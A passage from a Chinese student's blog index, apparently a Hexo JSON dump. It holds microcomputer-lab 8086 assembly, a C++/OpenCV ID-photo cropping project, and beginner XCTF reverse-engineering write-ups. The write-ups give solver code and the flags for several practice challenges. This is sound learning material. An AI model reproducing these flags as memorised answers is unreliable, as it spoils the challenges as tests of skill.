DX,290HIN AL,DXTEST AL,01HJNZ T11JMP UPCODE ENDSEND START 验收与答辩我本以为这老师挺好的 平日里和他相处的也不错 再加上这个实验的代码我大致理解的也还行 应该不会出什么问题 但是当老师来到了我们面前 缓缓地坐了下来 一切都变了 我们给他看运行的效果 他直接怼我说这个循环是要整体循环五次 可是我TM实验开始的时候就问你这个问题了啊 你怎么回答的我心里没有什么13数嘛 怎么到检查的时候你的检查标准就变了 我也是服了 更可恶的是 他问我的问题也及其刁钻 (这里就不说是啥问题了 我这辈子都不会理解的 以后再也不学这东西了反正) 结果就因为这个问题给了我个及格分 我就想着 为什么别人没做出来 分数都比我高 我一个自己一步一步理解的 而且运行结果都正确的一个程序 你个老头子给我个及格分 真是个只是表面上慈善的人啊 看不懂他的操作！！！！！！ 总结这几天的复习真的没有白做 功夫不负有心人 只要对得起自己就行 自己觉得自己理解了 自己学会了以前不懂的知识 这就够了 至于给多少分 已经不重要了 又是充实的一天 一天比一天进步就好 好了 周五的晚上也该放松放松了 就写到这里吧 明天还得继续我的微机复习呢！！！(看到这篇文章的你如果也为微机考试而烦恼的话 不要怕 干就完了 只要你努力 其实真不是很难！ )","categories":[{"name":"Study","slug":"Study","permalink":"https://github.com/gha01un/gha01un.github.io/categories/Study/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/gha01un/gha01un.github.io/tags/AI/"}],"author":"H1un"},{"title":"Principle and Interface Technology of Micro Computer","slug":"微机原理实验代码","date":"2020-06-16T03:48:47.014Z","updated":"2020-06-21T07:39:55.629Z","comments":true,"path":"2020/06/16/微机原理实验代码/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/06/16/%E5%BE%AE%E6%9C%BA%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81/","excerpt":"微机原理实验代码","text":"微机原理实验代码 0x01前言微机原理实验终于结束了最后一次课，几次实验下来感觉自己真的什么都不会 每次都是抱着巨佬的大腿过了实验！现在想起来实在惭愧 课余时间趁热打铁赶紧来复习一个这几次实验的代码 0x02 82551. 8255的输入输出实验CODE SEGMENTASSUME CS:CODESTART:MOV DX,28BH ；初始化8255MOV AL,10001001BOUT DX,ALTEST0:MOV DX,28AH ；C口读入开关状态IN AL,DXMOV DX,289H ；B口输出OUT DX,ALJMP TEST0 ；继续循环CODE ENDSEND START 2. 利用8255设计跑马灯CODECODE SEGMENTASSUME CS:CODESTART: ;初始化8255 MOV DX,28BH MOV AL,10001001B ;写控制字 OUT DX,AL MOV AH,80H ;暂存80位置的灯TEST1: MOV DX,28AH ;从C口读入开关状态 IN AL,DX CMP AL,80H JNZ TEST1TEST2: MOV AL,AH ;WORK MOV DX,289H ；B口输出 OUT DX,AL ROR AL,1 ；右移一位 MOV BX,100HLOOPO: ;延时 MOV CX,65535 LOOP1: LOOP LOOP1 DEC BX JNZ LOOPO MOV AH,AL ;暂存灯的状态 JMP TEST1 ；继续循环CODE ENDSEND START 0x03 82531. 8253定时，利用8253完成小灯的延时CODE SEGMENTASSUME CS:CODESTART:;第一级通道2，方式2，先写低字节，后写高字节MOV AL ,00110101BMOV DX ,28BHOUT DX,ALMOV AL,00H;计数初值5000MOV DX ,28AHOUT DX,ALMOV AL,50HOUT DX,AL;第二级通道0，方式3，先写低字节，再写高字节MOV AL,01110111BMOV DX,28BHOUT DX,ALMOV AL,00H;初值800MOV DX,288HOUT DX,ALMOV AL,08HOUT DX,ALCODE ENDSEND START 2. 运用8253硬件延时控制跑马灯运行CODE SEGMENTASSUME CS:CODESTART:MOV DX,2ABH ；初始化8255MOV AL,10001011BOUT DX,ALMOV AL,01H ；暂存第一个灯，保证起始第一个灯亮MOV BL,ALT2:MOV DX,2AAH ;判断是否是开关1IN AL,DXTEST AL,01HJZ T2T5: ;第一级通道0，方式2，先写低字节，后写高字节MOV AL ,10110101BMOV DX ,28BHOUT DX,ALMOV AL,00H ;计数初值5000MOV DX ,28AHOUT DX,ALMOV AL,50HOUT DX,ALMOV AL,00110111BMOV DX,28BHOUT DX,ALMOV AL,00HMOV DX,288HOUT DX,ALMOV AL,04HOUT DX,ALT3:MOV AL,BLMOV DX,2A8HOUT DX,AL ；输出到A口ROL AL,1 ;左移一位MOV BL,AL ；暂存当前灯的位置T4:MOV DX,2A9HIN AL,DXTEST AL,01HJNZ T4JMP T2CODE ENDSEND 0x04 A/D转换1. 0809CODE SEGMENTASSUME CS:CODESTART:MOV DX,283H ;初始化8255 MOV AL,10010000B OUT DX,AL TEST1:MOV DX,29CH ;虚写，启动一次转换OUT DX,AL TEST2:MOV DX,280HIN AL,DX ；A口读入EOC状态CMP AL,01H ；检查AL的D0是否等于1，若是则转换已经结束 JNZ TEST2 ；如果不是，继续检查MOV DX,29CHIN AL,DX ；读入转换后的数据MOV DX,282HOUT DX,AL ；C口输出JMP TEST1CODE ENDSEND START 2. 0832CODE SEGMENTASSUME CS:CODESTART: MOV AL,1AH ；下限电压 UP: MOV DX,290H OUT DX,AL MOV DX,291H OUT DX,AL MOV BX,20H ；两层嵌套循环，软延时 INC AL ；自增 LOOP2: MOV CX,65535LOOP1: LOOP LOOP1 DEC BX JNZ LOOP1 CMP AL, 100 ；比较是否达到上限值 JNZ UP ；没到继续上升 DEC ALDOWN: MOV DX,290H OUT DX,AL MOV DX,291H OUT DX,AL MOV BX,20H ；软延时 DEC AL ；自减LOOP3: MOV CX, 65535LOOP4: LOOP LOOP4 DEC BX JNZ LOOP3 CMP AL, 19H ；比较是否下降到下限值 JNZ DOWN ； 没到继续下降 JMP STARTCODE ENDSEND START 0x05 键盘实验1. 简单的44键盘(书上代码)PORT_A EQU 280HPORT_B EQU 281HPORT_C EQU 282HPORT_CTL EQU 283H DATA SEGMENTTABLE DB 77H,7BH,7DH,7EH,0B7H,0BBH,0BDH,0BEH,0D7H,0DBH,0DDH,0DEH,0E7H,0EBH,0EDH,0EEHDATA ENDS STACK SEGMENT STACKDW 50 DUP(0)TOP_STACK LABEL WORDSTACK ENDSCODE SEGMENT ASSUME CS:CODE,DS:DATA,SS:STACKSTART:MOV AX,STACKMOV SS,AXLEA SP,TOP_STACKMOV AX,DATAMOV DS,AX MOV DX,PORT_CTLMOV AL,10000010BOUT DX,ALRR:MOV DX,PORT_AMOV AL,00HOUT DX,AL MOV DX,PORT_B WAIT_OPEN:IN AL,DXAND AL,0FHCMP AL,0FHJNZ WAIT_OPEN WAIT_PRES:IN AL,DXAND AL,0FHCMP AL,0FHJE WAIT_PRES MOV CX,16EAHDELAY:LOOP DELAY IN AL,DXAND AL,0FHCMP AL,0FHJE WAIT_PRES MOV AL,0FEHMOV CL,AL NEXT_ROW:MOV DX,PORT_AOUT DX,ALMOV DX,PORT_BIN AL,DXAND AL,0FHCMP AL,0FHJNE ENCODEROL CL,01MOV AL,CLJMP NEXT_ROW ENCODE:MOV BX,000FHIN AL,DXNEXT_TRY:CMP AL,TABLE[BX]JE DONEDEC BXJNS NEXT_TRYMOV AH,01JMP EXITDONE:MOV AL,BLMOV DX,PORT_COUT DX,ALJMP RREXIT:HLTCODE ENDSEND 2. 实现数码管显示键盘按键PORT_A EQU 280H；A口地址PORT_B EQU 281H；B口地址PORT_C EQU 282H ；C口地址PORT_CTL EQU 283H；控制字寄存器地址DATA SEGMENT；键盘扫描码表TABLE DB 77H,7bH,7DH,7EH,0B7H,0BBH,0BDH,0BEH DB 0D7H,0DBH,0DDH,0DEH,0E7H,0EBH,0EDH,0EEH；0~F的七段代码编码TABLE1 DB 0BFH,86H,0dbH,0CFH,0E6H,0EdH,0FDH,87H DB 0FFH,0E7H,0F7H,0FCH,0B9H, 0DEH,0F9H,0F1HDATA ENDS；堆栈段STACK SEGMENT STACK DW 50 DUP(0)TOP_STACK LABEL WORDSTACK ENDS；代码段CODE SEGMENT ASSUME CS:CODE,DS:DATA;SS:STACKSTART: MOV AX,STACK MOV SS,AX LEA SP,TOP_STACK MOV AX,DATA MOV DS,AX MOV DX,PORT_CTL MOV AL,10000010B；8255初始化，A口输出，B口和C口输入，方式0 OUT DX,AL；向所有行送0S: MOV DX,PORT_A MOV AL,0 OUT DX,AL；读列，查看所有键是否松开 MOV DX,PORT_BWAIT_OPEN: IN AL,DX AND AL,0FH CMP AL,0FH JNE WAIT_OPEN；各键均已松开，查列是否有键按下WAIT_PRES: IN AL,DX AND AL,0FH CMP AL,0FH JE WAIT_PRES；再查列，看键是否仍被压着 IN AL,DX AND AL,0FH CMP AL,0FH JE WAIT_PRES；键仍被压着，确定哪一个键被压下 MOV AL,0FEH MOV CL,ALNEXT_ROW: MOV DX,PORT_A OUT DX,AL MOV DX,PORT_B IN AL,DX AND AL,0FH CMP AL,0FH JNE ENCODE；列值不全为1，表示有键按下，转去编码 ROL CL,01 MOV AL,CL JMP NEXT_ROW；已找到某一列为0，对压键的行列值编码ENCODE: MOV BX,000FH IN AL,DXNEXT_TRY: CMP AL,TABLE[BX]；比较读出的行列值和表中是否一致 JE DONE DEC BX JNS NEXT_TRY MOV AH,01 JMP EXITDONE: MOV DX,PORT_C；C口输出 MOV AL,TABLE1[BX]；查0~F的七段代码编码 OUT DX,AL JMP S ；循环检测该程序EXIT: HLTCODE ENDS END START 0x06 总结其实一道一道的做下来，感觉自己好像能看懂并理解一些代码了 还有很多不足的地方，晚上找个时间恶补一下 哦对了 周五就是实验考试了 我冲了！奥里给！！！","categories":[{"name":"Study","slug":"Study","permalink":"https://github.com/gha01un/gha01un.github.io/categories/Study/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/gha01un/gha01un.github.io/tags/AI/"}],"author":"H1un"},{"title":"基于人脸检测的批量证件照自动裁剪的研究及实现","slug":"基于人脸检测的批量证件照自动裁剪的研究及实现","date":"2020-06-15T14:00:32.331Z","updated":"2022-03-13T17:09:12.412Z","comments":true,"path":"2020/06/15/基于人脸检测的批量证件照自动裁剪的研究及实现/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/06/15/%E5%9F%BA%E4%BA%8E%E4%BA%BA%E8%84%B8%E6%A3%80%E6%B5%8B%E7%9A%84%E6%89%B9%E9%87%8F%E8%AF%81%E4%BB%B6%E7%85%A7%E8%87%AA%E5%8A%A8%E8%A3%81%E5%89%AA%E7%9A%84%E7%A0%94%E7%A9%B6%E5%8F%8A%E5%AE%9E%E7%8E%B0/","excerpt":"一篇关于小白实习的随笔","text":"一篇关于小白实习的随笔 前言大一暑假有幸去某某公司的人工智能部门做了一个关于人脸识别的小项目，007的工作的环境让我倍感压力。很多985优秀毕业生和研究生和我共处一个工作室，在他们的带领下，我在一步一步努力前行。 项目简介为了能够在很短的时间内将大批量的非证件照甚至非规则的照片裁剪成符合要求的并且看着舒服的标准证件照。 这个暑假我在同事和领导的帮助下试着对现有的代码进行了修改和扩充已实现其最优功能。 其实这个项目的主要核心并不多，简单来说分为以下两点： 第一，从一张不规则的照片中抠出只带有人脸的正方形图像 第二，找到最适合的扩大比例，对人脸进行外扩，得到以人脸为中心，四周均有空隙的一张标准证件照 项目基本思想最开始的思路由于图片大小不一，所以首先我对各类图片的大小进行了统一，我把照片中长宽较大像素的边且大于等于800像素的边规定为800像素，那么其对应的长或宽则等比例缩小，同理，把长和宽都小于800像素的照片中的较大的边规定为800像素，其对应边同比例扩大。这样就统一了所有不规则尺寸照片的大小了。接下来，对这些照片进行人脸的裁剪，因为这部分函数在我之前已经有人写好了，所以就直接调用了他们的函数，得到了只有人脸的人像。接下来就是对人脸照片的外扩，首先设裁剪出来人脸的宽=fw，高=fh，根据计算，人脸四周需要扩大的长度ext_dist=2/5*fw-（fw&gt;16?4:0）最为合适。这里先把试验基本的参数说明一下，原图片的宽和高分别为img_w，img_h；设原图片中长和宽较小的边min_len=std：：min(img_h,img_w);设ext_len=std::min(fw + 2 * ext_dist, min_len). 第一次试验的思路很简单，我们设人脸图片左上顶点的横纵坐标分别为f.x，f.y，则生成的标准证件照的左上顶点的坐标就为ret.x=std::max(0,f.x-ext_dist)；ret.y=std::max(0,f.y-ext_dist).也很容易得出标准证件照的宽和高分别为ret.width = (std::min(img_w - ret.x, ext_len))；ret.height = (std::min(img_h - ret.y, ext_len)). 进一步思考这样本以为此次试验的目的就已经达到了，但从测试结果来看，很多图片并没有达到我们预期的效果。分析代码来看，我们以左上顶点为基点，取标准证件照的宽和高时，如果fw+2*ext_dist大于原图片的宽和高，那么这张证件照的边长就取了原图片中较小的边作为证件照的边长，所以这时候就出现了有的证件照没有人下巴的状况了。 为了改善这一现状，我必须继续完善我的代码。在已经可以运行的代码处加入以下代码： if ((ret.y + fh / 2 + ext_dist) &gt; (ret.height - fh / 2 - ext_dist)) &#123; int yuantuwid = (img_w - fh) / 2; ret.x = std::max(0, f.x - ext_dist); ret.y = std::max(0, f.y - yuantuwid); ret.width = (std::min(img_w - ret.x, ext_len))&amp;~3; ret.height = (std::min(img_h - ret.y, ext_len))&amp;~3; cout &lt;&lt; \"裁剪前人脸左上\" &lt;&lt; f.x &lt;&lt; \" \" &lt;&lt; f.y &lt;&lt; \"裁剪前人脸右上\" &lt;&lt; f.x + fw &lt;&lt; \" \" &lt;&lt; f.y &lt;&lt; endl; cout &lt;&lt; \"裁剪前左下\" &lt;&lt; f.x &lt;&lt; \" \" &lt;&lt; f.y + fh &lt;&lt; \"裁剪前右下\" &lt;&lt; f.x + fw &lt;&lt; \" \" &lt;&lt; f.y + fh &lt;&lt; endl; cout &lt;&lt; \"裁剪后左上顶点\" &lt;&lt; ret.x &lt;&lt; \" \" &lt;&lt; ret.y &lt;&lt; \"裁剪后右上顶点\" &lt;&lt; ret.x + ret.width &lt;&lt; \" \" &lt;&lt; ret.y &lt;&lt; endl; cout &lt;&lt; \"裁剪后左下顶点\" &lt;&lt; ret.x &lt;&lt; \" \" &lt;&lt; ret.y + ret.height &lt;&lt; \"裁剪后右下顶点\" &lt;&lt; ret.x + ret.width &lt;&lt; \" \" &lt;&lt; ret.y + ret.height &lt;&lt; endl; &#125; 这段代码的意义大致为，我们不再以人像的左上顶点为基点，而是以人脸的中心点作为基点，向四周进行扩大，已得到最优证件照。这种方法很好的解决了部分证件照没有下巴的问题，并且在运行的过程中可以清楚的看到每一张人像和标准证件照的坐标点。在进行测试的过程中，基本上每张证件照都是人脸完整且居中的，但是我也清楚的发现有的证件照中的人脸图像所占比例比较大，而有的证件照中的人脸图像所占比例就比较小。究其原因分为以下两点，第一，原图片中人脸所占比例就已经很大，无法实现人脸四周分别外扩ext_dist长度的照片；其次，原图片的长宽比例有可能很不均衡，导致裁剪出来的照片人像占比太大。 最终算法为了能让所有人像占证件照的比例相同，我们不得不在原图的基础上加上一张比原图大的白图，让原图覆盖在较大的白图上，这样便可以使我们的裁剪工作变得更加顺利。首先，根据现有原图的大小来生成一张白图，我们先按原图9/5高和9/5宽的大小来确定白图的宽和高，简单的运用一个for循环和一个if语句，把所有白图存放到一个新的文件夹中去。接下来就是把所有的原图拷贝到白图中去，这个过程的原理大致为，将原图的所有像素点以二维数组的形式存放，运用双重for循环进行逐一拷贝，以得到原图在白图上覆盖的情况。 代码如下： int height = img.rows; int width = img.cols; cv::Mat img_new((int)height* 9.0 / 5, (int)width * 9.0 / 5, CV_8UC3, cv::Scalar(255, 255, 255)); //const char* temp_path = \"C:\\Users\\123\\Desktop\\1.jpg\"; cv::imwrite(dst_path_new, img_new); int m = width * 2 / 5; int n = height * 2 / 5; for (int i = 0; i &lt; height; i++) &#123; uchar* d = img.ptr&lt;uchar&gt;(i); uchar* d_b = img_new.ptr&lt;uchar&gt;(i+n); for (int j = 0; j &lt; width; j++) &#123; int b = d[j * 3]; int g = d[j * 3 + 1]; int r = d[j * 3 + 2]; d_b[j * 3+m*3]= b; d_b[j * 3 + 1+m*3]=g; d_b[j * 3 + 2+m*3]=r; &#125; &#125; 看一下运行效果: 批量照片的图片在这里就不贴上去了，感兴趣的师傅们可以和我私下交流经验! 项目总结通过上述代码我们便可以得到一张以原图为中心，四周均为白图的一张较大的图片，在这张图片的基础上我们便可以轻松的根据上边的裁剪代码来得到我们想要得到的完美证件照。经过几万张测试照片的测试，基本上这个程序可以很好的执行证件照裁剪的工作了。 其实这个项目的功能还有很多，比如对人脸性别的检测，人脸质量分数，人脸位置检测，人脸特征识别，以及对高糊图像的识别处理等等一系列算法 下面我贴一下我做的这个项目的main.cpp，还有很多其他代码没有贴，感兴趣的朋友欢迎来和我交流讨论！ #include &lt;time.h&gt;#include&lt;iostream&gt;#include &lt;sstream&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#ifdef linux //获取目录下的指定文件#include &lt;unistd.h&gt; #include &lt;dirent.h&gt; #endif #ifdef _WIN32 #include &lt;direct.h&gt; #include &lt;Windows.h&gt;#include &lt;io.h&gt; #endif #include &lt;facesdk.h&gt;#include &lt;opencv2/opencv.hpp&gt;using namespace std;#define OUTPUTMAXSIZE 384float face_quality(const Image&amp; image, const Face&amp; face);/*** @function: 获取cate_dir目录下的所有文件名* @param: cate_dir - string类型* @result：vector&lt;string&gt;类型*/int GetFilesInDirectory(std::vector&lt;string&gt; &amp;out, const string &amp;directory)&#123; if ((&amp;directory) == nullptr || directory.length() == 0)return -1; HANDLE dir; WIN32_FIND_DATA file_data; if ((dir = FindFirstFile((directory + \"/*\").c_str(), &amp;file_data)) == INVALID_HANDLE_VALUE) return -1; /* No files found */ do &#123; const string file_name = file_data.cFileName; const bool is_directory = (file_data.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) != 0; if (file_name[0] == '.') continue; if (file_name.length() &lt; 5) continue; //printf(\"%s\\n\", file_data.cFileName); string file_ext = &amp;file_data.cFileName[file_name.length() - 3]; // printf(\"%s\\n\", &amp;file_ext[0]); if (file_ext[0] &gt;= 'A' &amp;&amp; file_ext[0] &lt;= 'Z') file_ext[0] += 'a' - 'A'; if (file_ext[1] &gt;= 'A' &amp;&amp; file_ext[1] &lt;= 'Z') file_ext[1] += 'a' - 'A'; if (file_ext[2] &gt;= 'A' &amp;&amp; file_ext[2] &lt;= 'Z') file_ext[2] += 'a' - 'A'; if (0 == strcmp(&amp;file_ext[0], \"jpg\") || 0 == strcmp(&amp;file_ext[0], \"png\") || 0 == strcmp(&amp;file_ext[0], \"bmp\") ) &#123; &#125; else &#123; continue; &#125; if (is_directory) continue; out.push_back(file_name); &#125; while (FindNextFile(dir, &amp;file_data)); FindClose(dir); return out.size();&#125; // GetFilesInDirectoryRect ext_face_(int img_h, int img_w, Rect&amp; f)&#123; int min_len = std::min(img_h, img_w); int fw = f.width; int fh = f.height; int ext_dist = 2 / 5.0 * fw - (fw &gt; 16 ? 4 : 0); int ext_len = std::min(fw + 2 * ext_dist, min_len); Rect ret = &#123; 0 &#125;; ret.x = std::max(0, f.x - ext_dist); ret.y = std::max(0, f.y - ext_dist); ret.width = (std::min(img_w - ret.x, ext_len))&amp;~3; ret.height = (std::min(img_h - ret.y, ext_len))&amp;~3; cout &lt;&lt; \"没下巴裁剪后左上顶点\" &lt;&lt; ret.x &lt;&lt; \" \" &lt;&lt; ret.y &lt;&lt; \"没下巴裁剪后右上顶点\" &lt;&lt; ret.x + ret.width &lt;&lt; \" \" &lt;&lt; ret.y &lt;&lt; endl; cout &lt;&lt; \"没下巴裁剪后左下顶点\" &lt;&lt; ret.x &lt;&lt; \" \" &lt;&lt; ret.y + ret.height &lt;&lt; \"没下巴裁剪后右下顶点\" &lt;&lt; ret.x + ret.width &lt;&lt; \" \" &lt;&lt; ret.y + ret.height &lt;&lt; endl; if ((ret.y + fh/ 2+ext_dist)&gt;(ret.height-fh/2-ext_dist)) &#123; ret.x = std::max(0, f.x - ext_dist); ret.y = std::max(0, f.y - ext_dist); ret.width = (std::min(img_w - ret.x, fw + 2 * ext_dist))&amp;~3; ret.height = (std::min(img_h - ret.y, fw + 2 * ext_dist))&amp;~3; cout &lt;&lt; \"裁剪前人脸左上\" &lt;&lt; f.x &lt;&lt; \" \" &lt;&lt; f.y &lt;&lt; \"裁剪前人脸右上\" &lt;&lt; f.x + fw &lt;&lt; \" \" &lt;&lt; f.y &lt;&lt; endl; cout &lt;&lt; \"裁剪前左下\" &lt;&lt; f.x &lt;&lt; \" \" &lt;&lt; f.y + fh &lt;&lt; \"裁剪前右下\" &lt;&lt; f.x + fw &lt;&lt; \" \" &lt;&lt; f.y + fh &lt;&lt; endl; cout &lt;&lt; \"裁剪后左上顶点\" &lt;&lt; ret.x &lt;&lt; \" \" &lt;&lt; ret.y &lt;&lt; \"裁剪后右上顶点\" &lt;&lt; ret.x + ret.width &lt;&lt; \" \" &lt;&lt; ret.y &lt;&lt; endl; cout &lt;&lt; \"裁剪后左下顶点\" &lt;&lt; ret.x &lt;&lt; \" \" &lt;&lt; ret.y + ret.height &lt;&lt; \"裁剪后右下顶点\" &lt;&lt; ret.x + ret.width &lt;&lt; \" \" &lt;&lt; ret.y + ret.height &lt;&lt; endl; &#125; return ret;&#125;void cut_one_image(IFaceDetector* detector, IFaceMatcher* matcher, const char* src_path, const char* dst_path, const char* failed_path = nullptr)&#123; cv::Mat img = cv::imread(src_path); struct Image m_img; m_img.data = (char *)img.data; m_img.height = img.rows; m_img.width = img.cols; m_img.format = IMAGE_FORMAT_BGR; Face face; int ret = detector-&gt;DoDetect(m_img, NULL, face); if (ret != 1) &#123; printf(\"[E] Cannot detect face! file: %s\\n\", src_path); if (failed_path != nullptr)cv::imwrite(failed_path, img); return; &#125; float feature[2048]; bool r = matcher-&gt;ExtractFeature(m_img, face, (char*)feature, 2048); ErrorCode err = matcher-&gt;LastError(); float nm = feature[256]; //if(nm &lt;15.5) // printf(\"nm ===%f,%d,%d,%d,%d!!!!!!!!!!!!!!!!!\\n\", nm,r,err, m_img.width, m_img.height); //else // printf(\"nm ===%f,%d,%d,%d,%d\\n\", nm,r,err, m_img.width, m_img.height); printf(\"feature norm:%f\\t\", nm); float score = face_quality(m_img, face); if (nm &lt; 12) &#123; score = 15 + nm * 0.01; // printf(\"face feature is too poor,%d,%d,%d\\n\", nm,r,err, m_img.width, m_img.height); &#125; if (score &lt; 70) &#123; if (score &lt; 12) &#123; printf(\"[E!!!] Face Quality is too low! score:%f[eyes distance must big than 55]\\t file:%s\\t\", score, src_path); &#125; else if (score &lt; 15) &#123; printf(\"[E!!!] Face Quality is too low! score:%f[blur value must big than 30]\\t file:%s\\t\", score, src_path); &#125; else if (score &lt; 17) &#123; printf(\"[E!!!] Face Quality is too low! score:%f[face feature norm must big than 12]\\t file:%s\\t\", score, src_path); &#125; else &#123; printf(\"[E!!!] Face Quality is too low! score:%f[pose score must big than 70]\\t file:%s\\t\", score, src_path); &#125; if (failed_path != nullptr) &#123; printf(\"move to %s\\n\", failed_path); cv::imwrite(failed_path, img); &#125; else &#123; printf(\"\\n\"); &#125; return; &#125; Rect f = ext_face_(img.rows, img.cols, face.region); cv::Mat dst = img(cv::Rect(f.x, f.y, f.width, f.height)); if (f.width &lt; OUTPUTMAXSIZE) &#123; cv::imwrite(dst_path, dst); &#125; else &#123; cv::Mat dst2; cv::resize(dst, dst2, cv::Size(OUTPUTMAXSIZE, OUTPUTMAXSIZE)); cv::imwrite(dst_path, dst2); &#125;&#125;int main(int argc, char** argv) &#123; const char* inp_dir = nullptr; const char* out_dir = nullptr; const char* err_dir = nullptr; printf(\"Version:1.0\\nBuilt Date:%s\\n\", __DATE__); printf(\"Support:jpg,bmp,png\\n\"); printf(\"Usage: %s[input_dir][output_dir][failed_dir]\\n\", argv[0]); printf(\"=========================================================\\n\");#if 1 //if (argc != 3 &amp;&amp; argc != 4) //&#123; // printf(\"Usage: %s input_dir output_dir failed_dir\\n\",argv[0]); // return 0; //&#125; if (argc &gt; 1)inp_dir = argv[1]; else inp_dir = \"Input\"; if (argc &gt; 2)out_dir = argv[2]; else out_dir = \"Output\"; if (argc &gt; 3)err_dir = argv[3]; else err_dir = \"Error\"; IFaceDetector* detector = Create(IFaceDetector::DETECTOR_MODE_NORMAL); IFaceMatcher* matcher = Create(IFaceMatcher::TVT_MATCHER_MODE_19V101_NORMAL); detector-&gt;Init(NULL, NULL); matcher-&gt;Init(NULL, NULL); vector&lt;string&gt; files; int fcnt = GetFilesInDirectory(files, inp_dir); if (fcnt &lt; 0) &#123; return 0; &#125; CreateDirectory(out_dir, NULL); CreateDirectory(err_dir, NULL); int i = 0; for (auto file_name : files) &#123; i++; printf(\"\\n=========Processing %d%% [%d of %d]:%s==========\\n\", i * 100 / fcnt, i, fcnt, file_name.c_str()); string src = inp_dir; src += \"/\" + file_name; string dst = out_dir; dst += \"/\" + file_name; if (err_dir != nullptr) &#123; string failed = err_dir; failed += \"/\" + file_name; cut_one_image(detector, matcher, src.c_str(), dst.c_str(), failed.c_str()); &#125; else &#123; cut_one_image(detector, matcher, src.c_str(), dst.c_str()); &#125; &#125; Destroy(detector); Destroy(matcher);#endif system(\"pause\"); return 0;&#125; 实习感悟整个工程到这里基本上是完成了，经过半个月的尝试和无数次的失败，终于在领导和同事的大力帮助下，完成了这个项目。感谢公司给了我这次实习的机会，也很喜欢这里的工作环境，希望我能通过我的努力，一步一步的向各位优秀的哥哥姐姐们靠拢！加油！奥里给！！","categories":[{"name":"Study","slug":"Study","permalink":"https://github.com/gha01un/gha01un.github.io/categories/Study/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/gha01un/gha01un.github.io/tags/AI/"}],"author":"H1un"},{"title":"攻防世界_RESERVE_新手(1)","slug":"攻防世界RESERVE新手","date":"2020-06-15T03:54:45.208Z","updated":"2021-01-11T01:42:03.860Z","comments":true,"path":"2020/06/15/攻防世界RESERVE新手/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/06/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRESERVE%E6%96%B0%E6%89%8B/","excerpt":"XCTF-RE","text":"XCTF-RE 前言博客已经搭了有几周了，但是由于最近考试真的让我压力很大(对于菜鸡的我来说复习真的不是一件容易的事) 不想复习的我，来水水博客放松一下吧！ 不说了直接暴力上题！ 0x01.open-source首先当然是下载附件啦！ 一看是一个.c文件，啥也别说直接用sublime打开 第一次上传WP到自己的网站有点小小的激动！ 自我感觉这题好像跟逆向没有啥关系，让我们简单来分析一下吧！ 大概浏览一遍，发现hash貌似就是我们想要的flag，所以我们需要找到first，second和 strlen(argv[3]) 三个参数 unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; 直接来看第8行，其中atoi函数,是把字符串转为数字，如atoi(“123”)就是数字123， 所以 0xcafe 即:51966 unsigned int first = atoi(argv[1]); if (first != 0xcafe) &#123; printf(\"you are wrong, sorry.\\n\"); exit(2); &#125; 再来看第13行，参数对5取余不能等于3，且对17取余等于8，发现自然数25就可以 unsigned int second = atoi(argv[2]); if (second % 5 == 3 || second % 17 != 8) &#123; printf(\"ha, you won't get it!\\n\"); exit(3); &#125; 最后一个参数即argv[3]=h4cky0u! if (strcmp(\"h4cky0u\", argv[3])) &#123; printf(\"so close, dude!\\n\"); exit(4); &#125; 直接把三个参数的值改到程序上去 first = 0xcafe , （second%17）= 8 ，strlen(argv[3]) = strlen(&quot;h4cky0u&quot;) 现在我们编写简单脚本 #include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() &#123; unsigned int hash = 0xcafe * 31337 + 8 * 11 + strlen(\"h4cky0u\") - 1615810207; printf(\"Get your key: \"); printf(\"%x\\n\", hash); return 0;&#125; 得到flag！！！ 0x02.simple-unpack题目描述：菜鸡拿到了一个被加壳的二进制文件 由于菜鸡本人对kali虚拟机并不是很会用，所以只能先拖入winhex里碰碰运气看看是什么壳！ 尝试在winhex查找中输入flag 运气真好，把括号里的乱码删掉即为 flag{Upx_1s_n0t_a_d3liv3r_c0mp4ny} 0x03.logmein这道题终于涉及到了逆向ida静态分析，让我们把它拖入ida64(提前在exeinfope查看其为64位文件)，并佛系按下F5 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; size_t v3; // rsi int i; // [rsp+3Ch] [rbp-54h] char s[36]; // [rsp+40h] [rbp-50h] int v6; // [rsp+64h] [rbp-2Ch] __int64 v7; // [rsp+68h] [rbp-28h] char v8[8]; // [rsp+70h] [rbp-20h] int v9; // [rsp+8Ch] [rbp-4h] v9 = 0; strcpy(v8, \":\\\"AL_RT^L*.?+6/46\"); v7 = 28537194573619560LL; v6 = 7; printf(\"Welcome to the RC3 secure password guesser.\\n\", a2, a3); printf(\"To continue, you must enter the correct password.\\n\"); printf(\"Enter your guess: \"); __isoc99_scanf(\"%32s\", s); v3 = strlen(s); if ( v3 &lt; strlen(v8) ) sub_4007C0(v8); for ( i = 0; i &lt; strlen(s); ++i ) &#123; if ( i &gt;= strlen(v8) ) ((void (*)(void))sub_4007C0)(); if ( s[i] != (char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) ) ((void (*)(void))sub_4007C0)(); &#125; sub_4007F0();&#125; 仔细分析一下代码，发现这个for循环是找出flag的关键，写一个c++文件试一试吧 #include &lt;iostream&gt;#include &lt;stdio.h&gt;using namespace std; int main()&#123; long long a = 28537194573619560; //让v7=a char * p = (char*)&amp;a; //(char *)将int型指针(指向4个字节）转换成char型指针（指向一个字节） char b[] = \":\\\"AL_RT^L*.?+6/46\"; //使char b[]=v7 for(int i = 0;b[i]!=0;i++)&#123; //for循环执行 b[i] = b[i]^p[i%7]; &#125; cout&lt;&lt;b&lt;&lt;endl; 输出就得到flag啦！ flag{RC3-2016-XORISGUD} 0x04.insanity巨巨弱觉得前面的题目太难了，来个简单的缓一下 拖入ida中直接暴力F5，好像也没啥关键信息啊，这时候就要用到ida的各种快捷键了。 shift+F12看一看strings window中有没有什么有效信息 直接发现flag 9447{This_is_a_flag} 